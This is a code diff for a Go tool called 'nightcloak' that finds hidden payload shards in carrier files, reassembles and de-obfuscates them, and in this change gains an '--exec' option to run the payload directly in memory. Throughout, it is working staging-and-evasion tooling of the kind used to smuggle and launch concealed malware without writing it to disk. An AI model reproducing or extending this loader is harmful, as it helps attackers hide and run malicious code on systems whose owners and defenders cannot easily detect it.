@@ -20,7 +20,7 @@ import (
 	"nightcloak/pkg/shard"
 )
 
-	const version = "0.9.0"
+	const version = "0.9.1"
 
 	const banner = `
 	╔╗╔╦═╗╔═╗╦ ╦╔╦╗╔═╗╦  ╔═╗╔═╗╦╔═
@@ -519,16 +519,21 @@ func findCarriersInDir(dir string, n int) ([]string, error) {
 
 func cmdGather(args []string) {
 	var password, output string
+	var execute bool
 	args = parseFlags(args, map[string]*string{
 		"-p": &password, "--password": &password,
 		"-o": &output, "--output": &output,
-	}, map[string]*bool{})
+	}, map[string]*bool{
+		"--exec": &execute,
+	})
 
 	if len(args) < 1 {
-		die("usage: nightcloak gather <search_dir> [-p password] [-o output]")
+		die("usage: nightcloak gather <search_dir> [-p password] [-o output] [--exec] [-- <args...>]")
 	}
 
 	searchDir := args[0]
+	execArgs := args[1:]
+
 	password = resolvePassword(password)
 
 	// Step 1: Beacon scan.
@@ -626,7 +631,15 @@ func cmdGather(args []string) {
 		die("de-obfuscation failed: %v", err)
 	}
 
-	// Step 5: Output.
+	// Step 5: Output or Execution.
+	if execute {
+		log("Executing reconstructed payload in-memory...")
+		if err := native.MemExec(clearBytes, execArgs); err != nil {
+			die("in-memory execution failed: %v", err)
+		}
+		return
+	}
+
 	if output != "" {
 		if err := os.WriteFile(output, clearBytes, 0o644); err != nil {
 			die("writing output: %v", err)
